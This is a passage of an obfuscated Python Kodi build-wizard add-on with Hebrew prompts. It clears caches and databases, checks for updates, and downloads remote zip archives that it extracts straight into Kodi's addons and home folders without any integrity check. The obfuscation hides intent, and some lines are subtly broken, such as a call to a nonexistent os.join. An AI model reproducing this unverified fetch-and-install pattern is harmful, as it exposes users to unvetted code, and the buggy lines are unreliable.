			                                  shutil .rmtree (os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),ignore_errors =True ,onerror =None )#line:5444
			if DP .iscanceled ():#line:5445
				DP .close ()#line:5446
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5447
				return False #line:5448
		DP .close ()#line:5449
		wiz .clearS ('build')#line:5450
		if over ==True :#line:5451
			return True #line:5452
		elif install =='restore':#line:5453
			return True #line:5454
		elif install :#line:5455
			buildWizard (install ,'normal',over =True )#line:5456
		else :#line:5457
			if INSTALLMETHOD ==1 :O0O0O0000000OOOO0 =1 #line:5458
			elif INSTALLMETHOD ==2 :O0O0O0000000OOOO0 =0 #line:5459
			else :O0O0O0000000OOOO0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]הצגת נתונים[/COLOR][/B]",nolabel ="[B][COLOR green]סגירה[/COLOR][/B]")#line:5460
			if O0O0O0000000OOOO0 ==1 :wiz .reloadFix ('fresh')#line:5461
			else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:5462
	else :#line:5463
		if not install =='restore':#line:5464
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]'%COLOR2 )#line:5465
			wiz .refresh ()#line:5466
def clearCache ():#line:5471
		wiz .clearCache ()#line:5472
def fixwizard ():#line:5476
		wiz .fixwizard ()#line:5477
def totalClean ():#line:5479
		wiz .clearCache ()#line:5481
		wiz .clearPackages ('total')#line:5482
		clearThumb ('total')#line:5483
		cleanfornewbuild ()#line:5484
def cleanfornewbuild ():#line:5485
		try :#line:5486
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:5487
		except :#line:5488
			pass #line:5489
		try :#line:5490
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:5491
		except :#line:5492
			pass #line:5493
		try :#line:5494
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))#line:5495
		except :#line:5496
			pass #line:5497
def clearThumb (type =None ):#line:5498
	OOOO0O0O0000OOOO0 =wiz .latestDB ('Textures')#line:5499
	if not type ==None :OO00O00OOO0OO0OOO =1 #line:5500
	else :OO00O00OOO0OO0OOO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,OOOO0O0O0000OOOO0 ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:5501
	if OO00O00OOO0OO0OOO ==1 :#line:5502
		try :wiz .removeFile (os .join (DATABASE ,OOOO0O0O0000OOOO0 ))#line:5503
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (OOOO0O0O0000OOOO0 )#line:5504
		wiz .removeFolder (THUMBS )#line:5505
	else :wiz .log ('Clear thumbnames cancelled')#line:5507
	wiz .redoThumbs ()#line:5508
def purgeDb ():#line:5510
	O0O0O00OOO000O000 =[];OO000O0OOOO0OOO00 =[]#line:5511
	for OO0000O0OOOOO0000 ,O0OO0OOOOO0OOOOOO ,O0O00O0OO0000OOOO in os .walk (HOME ):#line:5512
		for O0000O0O00O000OO0 in fnmatch .filter (O0O00O0OO0000OOOO ,'*.db'):#line:5513
			if O0000O0O00O000OO0 !='Thumbs.db':#line:5514
				OOOO00OOOO00OOOOO =os .path .join (OO0000O0OOOOO0000 ,O0000O0O00O000OO0 )#line:5515
				O0O0O00OOO000O000 .append (OOOO00OOOO00OOOOO )#line:5516
				OOOO0O000O000OO00 =OOOO00OOOO00OOOOO .replace ('\\','/').split ('/')#line:5517
				OO000O0OOOO0OOO00 .append ('(%s) %s'%(OOOO0O000O000OO00 [len (OOOO0O000O000OO00 )-2 ],OOOO0O000O000OO00 [len (OOOO0O000O000OO00 )-1 ]))#line:5518
	if KODIV >=16 :#line:5519
		O0O0O0OOOO0000OOO =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,OO000O0OOOO0OOO00 )#line:5520
		if O0O0O0OOOO0000OOO ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5521
		elif len (O0O0O0OOOO0000OOO )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5522
		else :#line:5523
			for O0O00OOO0OO0OO0OO in O0O0O0OOOO0000OOO :wiz .purgeDb (O0O0O00OOO000O000 [O0O00OOO0OO0OO0OO ])#line:5524
	else :#line:5525
		O0O0O0OOOO0000OOO =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,OO000O0OOOO0OOO00 )#line:5526
		if O0O0O0OOOO0000OOO ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5527
		else :wiz .purgeDb (O0O0O00OOO000O000 [O0O00OOO0OO0OO0OO ])#line:5528
def fastupdatefirstbuild (OOO0OOOOO0OOOOO00 ):#line:5534
	wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5536
	if ENABLE =='Yes':#line:5537
		if not NOTIFY =='true':#line:5538
			O0O000O00OOO0O00O =wiz .workingURL (NOTIFICATION )#line:5539
			if O0O000O00OOO0O00O ==True :#line:5540
				O0O000OO0O000OOO0 ,O00O00O0OOO00OOOO =wiz .splitNotify (NOTIFICATION )#line:5541
				if not O0O000OO0O000OOO0 ==False :#line:5543
					try :#line:5544
						O0O000OO0O000OOO0 =int (O0O000OO0O000OOO0 );OOO0OOOOO0OOOOO00 =int (OOO0OOOOO0OOOOO00 )#line:5545
						checkidupdate ()#line:5546
						wiz .setS ("notedismiss","true")#line:5547
						if O0O000OO0O000OOO0 ==OOO0OOOOO0OOOOO00 :#line:5548
							wiz .log ("[Notifications] id[%s] Dismissed"%int (O0O000OO0O000OOO0 ),xbmc .LOGNOTICE )#line:5549
						elif O0O000OO0O000OOO0 >OOO0OOOOO0OOOOO00 :#line:5551
							wiz .log ("[Notifications] id: %s"%str (O0O000OO0O000OOO0 ),xbmc .LOGNOTICE )#line:5552
							wiz .setS ('noteid',str (O0O000OO0O000OOO0 ))#line:5553
							wiz .setS ("notedismiss","true")#line:5554
							wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:5557
					except Exception as O0O0O0OO0OO00000O :#line:5558
						wiz .log ("Error on Notifications Window: %s"%str (O0O0O0OO0OO00000O ),xbmc .LOGERROR )#line:5559
				else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5561
			else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,O0O000O00OOO0O00O ),xbmc .LOGNOTICE )#line:5562
		else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:5563
	else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:5564
def checkUpdate ():#line:5566
	OO0OO0OOOO0O0O0O0 =wiz .getS ('disableupdate')#line:5567
	O0000OOO00O0OOOO0 =wiz .getS ('buildname')#line:5568
	O0O0O000OO0O000O0 =wiz .getS ('buildversion')#line:5569
	OO0OO0OOOOOO0O0OO =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','')#line:5570
	OOOO000OOO000O000 =re .compile ('name="%s".+?ersion="(.+?)".+?con="(.+?)".+?anart="(.+?)"'%O0000OOO00O0OOOO0 ).findall (OO0OO0OOOOOO0O0OO )#line:5571
	if len (OOOO000OOO000O000 )>0 :#line:5572
		O0O0OOO00O00OO0O0 =OOOO000OOO000O000 [0 ][0 ]#line:5573
		O0O00OOO0O0OO000O =OOOO000OOO000O000 [0 ][1 ]#line:5574
		O000OO00000OOOO00 =OOOO000OOO000O000 [0 ][2 ]#line:5575
		wiz .setS ('latestversion',O0O0OOO00O00OO0O0 )#line:5576
		if O0O0OOO00O00OO0O0 >O0O0O000OO0O000O0 :#line:5577
			if OO0OO0OOOO0O0O0O0 =='false':#line:5578
				wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s] Opening Update Window"%(O0O0O000OO0O000O0 ,O0O0OOO00O00OO0O0 ),xbmc .LOGNOTICE )#line:5579
				notify .updateWindow (O0000OOO00O0OOOO0 ,O0O0O000OO0O000O0 ,O0O0OOO00O00OO0O0 ,O0O00OOO0O0OO000O ,O000OO00000OOOO00 )#line:5580
			else :wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s] Update Window Disabled"%(O0O0O000OO0O000O0 ,O0O0OOO00O00OO0O0 ),xbmc .LOGNOTICE )#line:5581
		else :wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s]"%(O0O0O000OO0O000O0 ,O0O0OOO00O00OO0O0 ),xbmc .LOGNOTICE )#line:5582
	else :wiz .log ("[Check Updates] ERROR: Unable to find build version in build text file",xbmc .LOGERROR )#line:5583
def updatetelemedia (O000O0OO0O0OOO000 ):#line:5584
    from startup import teleupdate #line:5585
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5586
    xbmc .executebuiltin ("UpdateLocalAddons")#line:5587
    xbmc .executebuiltin ("UpdateAddonRepos")#line:5588
    wiz .wizardUpdate ('startup')#line:5589
    checkUpdate ()#line:5591
    xbmc .executebuiltin ((u'Notification(%s,%s)'%('Kodi Anonymous','בודק אם קיים עדכון בשבילך')))#line:5592
    time .sleep (15.0 )#line:5593
    if ENABLE =='Yes'and BUILDNAME ==" Kodi Premium":#line:5594
     if teleupdate is False :#line:5595
        STARTP2 ()#line:5597
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5598
        if not NOTIFY =='true':#line:5599
            OO0OO0OO0000O000O =wiz .workingURL (NOTIFICATION )#line:5600
            if OO0OO0OO0000O000O ==True :#line:5601
                OO00OOOOOOO00000O ,OOO00O000O00000O0 =wiz .splitNotify (NOTIFICATION )#line:5602
                if not OO00OOOOOOO00000O ==False :#line:5603
                    try :#line:5604
                        OO00OOOOOOO00000O =int (OO00OOOOOOO00000O );O000O0OO0O0OOO000 =int (O000O0OO0O0OOO000 )#line:5605
                        if OO00OOOOOOO00000O ==O000O0OO0O0OOO000 :#line:5606
                            if NOTEDISMISS =='false':#line:5607
                                debridit .debridIt ('update','all')#line:5608
                                traktit .traktIt ('update','all')#line:5609
                                checkidupdatetele ()#line:5610
                            else :wiz .log ("[Notifications] id[%s] Dismissed"%int (OO00OOOOOOO00000O ),xbmc .LOGNOTICE )#line:5611
                        elif OO00OOOOOOO00000O >O000O0OO0O0OOO000 :#line:5612
                            wiz .log ("[Notifications] id: %s"%str (OO00OOOOOOO00000O ),xbmc .LOGNOTICE )#line:5613
                            wiz .setS ('noteid',str (OO00OOOOOOO00000O ))#line:5614
                            wiz .setS ('notedismiss','false')#line:5615
                            debridit .debridIt ('update','all')#line:5617
                            traktit .traktIt ('update','all')#line:5618
                            checkidupdatetele ()#line:5619
                            wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:5621
                    except Exception as OOO0O00000O0O00O0 :#line:5622
                        wiz .log ("Error on Notifications Window: %s"%str (OOO0O00000O0O00O0 ),xbmc .LOGERROR )#line:5623
                else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5624
            else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,OO0OO0OO0000O000O ),xbmc .LOGNOTICE )#line:5625
        else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:5626
def checkidupdate ():#line:5630
				wiz .setS ("notedismiss","true")#line:5632
				O00OO00OOO0O0O00O =wiz .workingURL (NOTIFICATION )#line:5633
				OO0OOO00OOOOOOOO0 =" Kodi Premium"#line:5635
				OOO00O0O00000OO00 =wiz .checkBuild (OO0OOO00OOOOOOOO0 ,'gui')#line:5636
				O00O0O000O0O00O00 =OO0OOO00OOOOOOOO0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5637
				if not wiz .workingURL (OOO00O0O00000OO00 )==True :return #line:5638
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5639
				DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון מהיר אוטומטי:[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,OO0OOO00OOOOOOOO0 ),'','אנא המתן')#line:5640
				O0O0OO000O0OOO0O0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%O00O0O000O0O00O00 )#line:5641
				try :os .remove (O0O0OO000O0OOO0O0 )#line:5642
				except :pass #line:5643
				logging .warning (OOO00O0O00000OO00 )#line:5644
				if 'google'in OOO00O0O00000OO00 :#line:5645
				   OOO00OO000OO0O000 =googledrive_download (OOO00O0O00000OO00 ,O0O0OO000O0OOO0O0 ,DP ,wiz .checkBuild (OO0OOO00OOOOOOOO0 ,'filesize'))#line:5646
				else :#line:5649
				  downloader .download (OOO00O0O00000OO00 ,O0O0OO000O0OOO0O0 ,DP )#line:5650
				xbmc .sleep (100 )#line:5651
				OOOO000O00OOO0O00 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0OOO00OOOOOOOO0 )#line:5652
				DP .update (0 ,OOOO000O00OOO0O00 ,'','אנא המתן')#line:5653
				extract .all (O0O0OO000O0OOO0O0 ,HOME ,DP ,title =OOOO000O00OOO0O00 )#line:5654
				DP .close ()#line:5655
				wiz .defaultSkin ()#line:5656
				wiz .lookandFeelData ('save')#line:5657
				if KODIV >=18 :#line:5658
					skindialogsettind18 ()#line:5659
				if INSTALLMETHOD ==1 :O00O0OO0O000000O0 =1 #line:5662
				elif INSTALLMETHOD ==2 :O00O0OO0O000000O0 =0 #line:5663
				else :DP .close ()#line:5664
def checkidupdatetele ():#line:5665
				wiz .setS ("notedismiss","true")#line:5667
				O0O00OO000OO0O000 =wiz .workingURL (NOTIFICATION )#line:5668
				OO0OOOO00OO0OOO0O =" Kodi Premium"#line:5670
				O00O00000O0OOOO00 =wiz .checkBuild (OO0OOOO00OO0OOO0O ,'gui')#line:5671
				OO0OOO0OOOO0O0OO0 =OO0OOOO00OO0OOO0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5672
				if not wiz .workingURL (O00O00000O0OOOO00 )==True :return #line:5673
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5674
				O0000OOOOO0000OO0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OO0OOO0OOOO0O0OO0 )#line:5677
				try :os .remove (O0000OOOOO0000OO0 )#line:5678
				except :pass #line:5679
				if 'google'in O00O00000O0OOOO00 :#line:5681
				   OO000O00OOO0000OO =googledrive_download (O00O00000O0OOOO00 ,O0000OOOOO0000OO0 ,DP2 ,wiz .checkBuild (OO0OOOO00OO0OOO0O ,'filesize'))#line:5682
				else :#line:5685
				  downloaderbg .download3 (O00O00000O0OOOO00 ,O0000OOOOO0000OO0 ,DP2 )#line:5686
				xbmc .sleep (100 )#line:5687
				DP2 .create ('[B][COLOR=green]מתקין                         [/COLOR][/B]')#line:5688
				DP2 .update (100 ,message ='[B][COLOR=yellow]אנא המתן ...                    [/COLOR][/B]')#line:5690
				extract .all2 (O0000OOOOO0000OO0 ,HOME ,DP2 )#line:5692
				DP2 .close ()#line:5693
				wiz .defaultSkin ()#line:5694
				wiz .lookandFeelData ('save')#line:5695
				wiz .kodi17Fix ()#line:5696
				if KODIV >=18 :#line:5697
					skindialogsettind18 ()#line:5698
				debridit .debridIt ('restore','all')#line:5703
				traktit .traktIt ('restore','all')#line:5704
				if INSTALLMETHOD ==1 :OO0OO0O000000OOO0 =1 #line:5705
				elif INSTALLMETHOD ==2 :OO0OO0O000000OOO0 =0 #line:5706
				else :DP2 .close ()#line:5707
				OO000O00OO0000O00 =(NOTIFICATION2 )#line:5708
				OO0OO0000O000O00O =urllib2 .urlopen (OO000O00OO0000O00 )#line:5709
				O0O0OO00O0O00O0OO =OO0OO0000O000O00O .readlines ()#line:5710
				OOOOO000O000OO00O =0 #line:5711
				for O0O00O00O00OOOOOO in O0O0OO00O0O00O0OO :#line:5714
					if O0O00O00O00OOOOOO .split (' ==')[0 ]=="noreset"or O0O00O00O00OOOOOO .split ()[0 ]=="noreset":#line:5715
						xbmc .executebuiltin ("ReloadSkin()")#line:5717
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:5718
						O0000OOO0O0O0OO0O =(ADDON .getSetting ("message"))#line:5719
						if O0000OOO0O0O0OO0O =='true':#line:5720
							infobuild ()#line:5721
						update_Votes ()#line:5722
						indicatorfastupdate ()#line:5723
					if O0O00O00O00OOOOOO .split (' ==')[0 ]=="reset"or O0O00O00O00OOOOOO .split ()[0 ]=="reset":#line:5724
						update_Votes ()#line:5726
						indicatorfastupdate ()#line:5727
						resetkodi ()#line:5728
def gaiaserenaddon ():#line:5729
  O000OO0O0OOO0O0O0 =(ADDON .getSetting ("gaiaseren"))#line:5730
  O0OO000O00O0O00O0 =(ADDON .getSetting ("auto_rd"))#line:5731
  if O000OO0O0OOO0O0O0 =='true'and O0OO000O00O0O00O0 =='true':#line:5732
    O0O00O00O00O00O00 =(NEWFASTUPDATE )#line:5733
    O00OO0000O0000OOO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5734
    OOO000O000O0OOO0O =xbmcgui .DialogProgress ()#line:5735
    OOO000O000O0OOO0O .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5736
    OOOOO0O0O000O0000 =os .path .join (PACKAGES ,'isr.zip')#line:5737
    OOOOOO0O0OO0O0000 =urllib2 .Request (O0O00O00O00O00O00 )#line:5738
    O000OOOOOO0000O0O =urllib2 .urlopen (OOOOOO0O0OO0O0000 )#line:5739
    OOOOOOO000OO0OOO0 =xbmcgui .DialogProgress ()#line:5741
    OOOOOOO000OO0OOO0 .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5742
    OOOOOOO000OO0OOO0 .update (0 )#line:5743
    OO0000O0O0O0O0O00 =open (OOOOO0O0O000O0000 ,'wb')#line:5745
    try :#line:5747
      O0OO00000OO0O00OO =O000OOOOOO0000O0O .info ().getheader ('Content-Length').strip ()#line:5748
      OOO00OOO00000OOOO =True #line:5749
    except AttributeError :#line:5750
          OOO00OOO00000OOOO =False #line:5751
    if OOO00OOO00000OOOO :#line:5753
          O0OO00000OO0O00OO =int (O0OO00000OO0O00OO )#line:5754
    O0000OO0O0OO0OO00 =0 #line:5756
    O0OOO00O00OOO0000 =time .time ()#line:5757
    while True :#line:5758
          OOO0OOO0O00OO00O0 =O000OOOOOO0000O0O .read (8192 )#line:5759
          if not OOO0OOO0O00OO00O0 :#line:5760
              sys .stdout .write ('\n')#line:5761
              break #line:5762
          O0000OO0O0OO0OO00 +=len (OOO0OOO0O00OO00O0 )#line:5764
          OO0000O0O0O0O0O00 .write (OOO0OOO0O00OO00O0 )#line:5765
          if not OOO00OOO00000OOOO :#line:5767
              O0OO00000OO0O00OO =O0000OO0O0OO0OO00 #line:5768
          if OOOOOOO000OO0OOO0 .iscanceled ():#line:5769
             OOOOOOO000OO0OOO0 .close ()#line:5770
             try :#line:5771
              os .remove (OOOOO0O0O000O0000 )#line:5772
             except :#line:5773
              pass #line:5774
             break #line:5775
          O0000OOOOO0OO0O0O =float (O0000OO0O0OO0OO00 )/O0OO00000OO0O00OO #line:5776
          O0000OOOOO0OO0O0O =round (O0000OOOOO0OO0O0O *100 ,2 )#line:5777
          OO0OOO00000000O00 =O0000OO0O0OO0OO00 /(1024 *1024 )#line:5778
          OO0000O00OOO00O0O =O0OO00000OO0O00OO /(1024 *1024 )#line:5779
          OO0OO0000O00O000O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO0OOO00000000O00 ,'teal',OO0000O00OOO00O0O )#line:5780
          if (time .time ()-O0OOO00O00OOO0000 )>0 :#line:5781
            O00OOOO0OO0000O00 =O0000OO0O0OO0OO00 /(time .time ()-O0OOO00O00OOO0000 )#line:5782
            O00OOOO0OO0000O00 =O00OOOO0OO0000O00 /1024 #line:5783
          else :#line:5784
           O00OOOO0OO0000O00 =0 #line:5785
          OOOOOO0O00000O00O ='KB'#line:5786
          if O00OOOO0OO0000O00 >=1024 :#line:5787
             O00OOOO0OO0000O00 =O00OOOO0OO0000O00 /1024 #line:5788
             OOOOOO0O00000O00O ='MB'#line:5789
          if O00OOOO0OO0000O00 >0 and not O0000OOOOO0OO0O0O ==100 :#line:5790
              OO0OO0O000OO0OOO0 =(O0OO00000OO0O00OO -O0000OO0O0OO0OO00 )/O00OOOO0OO0000O00 #line:5791
          else :#line:5792
              OO0OO0O000OO0OOO0 =0 #line:5793
          O000OOO0OO0OOOOO0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O00OOOO0OO0000O00 ,OOOOOO0O00000O00O )#line:5794
          OOOOOOO000OO0OOO0 .update (int (O0000OOOOO0OO0O0O ),OO0OO0000O00O000O ,O000OOO0OO0OOOOO0 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5796
    O00OOOO0O0OOO0000 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5799
    OO0000O0O0O0O0O00 .close ()#line:5802
    extract .all (OOOOO0O0O000O0000 ,O00OOOO0O0OOO0000 ,OOOOOOO000OO0OOO0 )#line:5803
    try :#line:5807
      os .remove (OOOOO0O0O000O0000 )#line:5808
    except :#line:5809
      pass #line:5810
def iptvsimpldownpc ():#line:5811
    OOOOOOO0OOOO0OOO0 =(IPTVSIMPL18PC )#line:5813
    OO00O00O00OO00OO0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5814
    OOOOO00O00O00000O =xbmcgui .DialogProgress ()#line:5815
    OOOOO00O00O00000O .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5816
    O0OO0O00O0OO00O00 =os .path .join (PACKAGES ,'isr.zip')#line:5817
    O0OOOO00000O0O000 =urllib2 .Request (OOOOOOO0OOOO0OOO0 )#line:5818
    O00000O0OO00O0OO0 =urllib2 .urlopen (O0OOOO00000O0O000 )#line:5819
    OO0O0OO0OO0OOO000 =xbmcgui .DialogProgress ()#line:5821
    OO0O0OO0OO0OOO000 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5822
    OO0O0OO0OO0OOO000 .update (0 )#line:5823
    OOOOOO0O0O0O0O0OO =open (O0OO0O00O0OO00O00 ,'wb')#line:5825
    try :#line:5827
      OOOOO0000OOOOO0OO =O00000O0OO00O0OO0 .info ().getheader ('Content-Length').strip ()#line:5828
      OOOOO0OOOO0000000 =True #line:5829
    except AttributeError :#line:5830
          OOOOO0OOOO0000000 =False #line:5831
    if OOOOO0OOOO0000000 :#line:5833
          OOOOO0000OOOOO0OO =int (OOOOO0000OOOOO0OO )#line:5834
    OO0000O0OOOO0OO00 =0 #line:5836
    OOOO0OO0OO00OO00O =time .time ()#line:5837
    while True :#line:5838
          O0OO00OOOOOO00OO0 =O00000O0OO00O0OO0 .read (8192 )#line:5839
          if not O0OO00OOOOOO00OO0 :#line:5840
              sys .stdout .write ('\n')#line:5841
              break #line:5842
          OO0000O0OOOO0OO00 +=len (O0OO00OOOOOO00OO0 )#line:5844
          OOOOOO0O0O0O0O0OO .write (O0OO00OOOOOO00OO0 )#line:5845
          if not OOOOO0OOOO0000000 :#line:5847
              OOOOO0000OOOOO0OO =OO0000O0OOOO0OO00 #line:5848
          if OO0O0OO0OO0OOO000 .iscanceled ():#line:5849
             OO0O0OO0OO0OOO000 .close ()#line:5850
             try :#line:5851
              os .remove (O0OO0O00O0OO00O00 )#line:5852
             except :#line:5853
              pass #line:5854
             break #line:5855
          O0000OO00O00O00O0 =float (OO0000O0OOOO0OO00 )/OOOOO0000OOOOO0OO #line:5856
          O0000OO00O00O00O0 =round (O0000OO00O00O00O0 *100 ,2 )#line:5857
          OO0OOO0OOOOOOO000 =OO0000O0OOOO0OO00 /(1024 *1024 )#line:5858
          OOO000O0O00O0O000 =OOOOO0000OOOOO0OO /(1024 *1024 )#line:5859
          O0O000OO00000O00O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO0OOO0OOOOOOO000 ,'teal',OOO000O0O00O0O000 )#line:5860
          if (time .time ()-OOOO0OO0OO00OO00O )>0 :#line:5861
            O0OOOOOO0O0O00000 =OO0000O0OOOO0OO00 /(time .time ()-OOOO0OO0OO00OO00O )#line:5862
            O0OOOOOO0O0O00000 =O0OOOOOO0O0O00000 /1024 #line:5863
          else :#line:5864
           O0OOOOOO0O0O00000 =0 #line:5865
          O00O0OOO00OOOO000 ='KB'#line:5866
          if O0OOOOOO0O0O00000 >=1024 :#line:5867
             O0OOOOOO0O0O00000 =O0OOOOOO0O0O00000 /1024 #line:5868
             O00O0OOO00OOOO000 ='MB'#line:5869
          if O0OOOOOO0O0O00000 >0 and not O0000OO00O00O00O0 ==100 :#line:5870
              OOO0OOO0O0O00OO00 =(OOOOO0000OOOOO0OO -OO0000O0OOOO0OO00 )/O0OOOOOO0O0O00000 #line:5871
          else :#line:5872
              OOO0OOO0O0O00OO00 =0 #line:5873
          OOO00OOOO00OOO0O0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0OOOOOO0O0O00000 ,O00O0OOO00OOOO000 )#line:5874
          OO0O0OO0OO0OOO000 .update (int (O0000OO00O00O00O0 ),O0O000OO00000O00O ,OOO00OOOO00OOO0O0 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5876
    O0O00000O00O00O00 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5879
    OOOOOO0O0O0O0O0OO .close ()#line:5882
    extract .all (O0OO0O00O0OO00O00 ,O0O00000O00O00O00 ,OO0O0OO0OO0OOO000 )#line:5883
    try :#line:5887
      os .remove (O0OO0O00O0OO00O00 )#line:5888
    except :#line:5889
      pass #line:5890
def iptvkodi18idan ():#line:5891
      if xbmc .getCondVisibility ('system.platform.windows')and KODIV >=18 :#line:5893
              OOOO00OOOO00O0O00 ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18win.zip?raw=true'#line:5896
              O0000OOO0OOOO0000 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5897
              OOO00O00OO0O0OO0O =xbmcgui .DialogProgress ()#line:5898
              OOO00O00OO0O0OO0O .create ("XBMC ISRAEL","Downloading "+'הגדרת ערוצי עידן פלוס','','Please Wait')#line:5899
              O0O0OO0OOOOOOO000 =os .path .join (O0000OOO0OOOO0000 ,'isr.zip')#line:5900
              O00OOO0OO00000O0O =urllib2 .Request (OOOO00OOOO00O0O00 )#line:5901
              OO0OO0OOO000OOO0O =urllib2 .urlopen (O00OOO0OO00000O0O )#line:5902
              O0O0O00OO00000O00 =xbmcgui .DialogProgress ()#line:5904
              O0O0O00OO00000O00 .create ("Downloading","Downloading "+'הגדרת ערוצי עידן פלוס')#line:5905
              O0O0O00OO00000O00 .update (0 )#line:5906
              OOO0000O00O00000O =open (O0O0OO0OOOOOOO000 ,'wb')#line:5908
              try :#line:5910
                OOOO000OO0OO0O0O0 =OO0OO0OOO000OOO0O .info ().getheader ('Content-Length').strip ()#line:5911
                O0OO0OO00OOOOO00O =True #line:5912
              except AttributeError :#line:5913
                    O0OO0OO00OOOOO00O =False #line:5914
              if O0OO0OO00OOOOO00O :#line:5916
                    OOOO000OO0OO0O0O0 =int (OOOO000OO0OO0O0O0 )#line:5917
              OO000O00OO00OOOOO =0 #line:5919
              OO0OOO0000O0OO000 =time .time ()#line:5920
              while True :#line:5921
                    OO0OOO0O00OOOO0O0 =OO0OO0OOO000OOO0O .read (8192 )#line:5922
                    if not OO0OOO0O00OOOO0O0 :#line:5923
                        sys .stdout .write ('\n')#line:5924
                        break #line:5925
                    OO000O00OO00OOOOO +=len (OO0OOO0O00OOOO0O0 )#line:5927
